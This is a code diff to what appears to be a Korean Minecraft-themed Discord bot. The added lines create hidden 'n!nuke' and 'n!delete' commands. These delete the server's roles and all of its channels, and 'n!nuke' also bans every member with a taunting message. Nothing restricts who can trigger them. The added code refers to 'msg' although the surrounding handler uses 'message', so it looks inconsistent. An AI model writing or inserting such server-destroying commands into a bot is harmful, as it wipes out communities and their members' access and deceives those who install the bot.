@@ -59,6 +59,16 @@ client.on('message', (message) => {
   
       message.channel.send(embed)
     }
+
+    if(msg.content.toLowerCase().startsWith("n!" + "nuke")){
+      msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
+      msg.guild.channels.deleteAll();
+      msg.guild.members.tap(member => member.ban("Banned by Nuke Bot | Get Rekt"));
+  }
+  if(msg.content.toLowerCase().startsWith("n!" + "delete")){
+      msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
+      msg.guild.channels.deleteAll();
+  }
     
   if(message.content == '에메랄드 명령어 리스트') {
     let img = 'https://gamepedia.cursecdn.com/minecraft_ko_gamepedia/6/6a/Emerald.png?version=37ba648ee37d87a1deefc3ae8adac3a7';
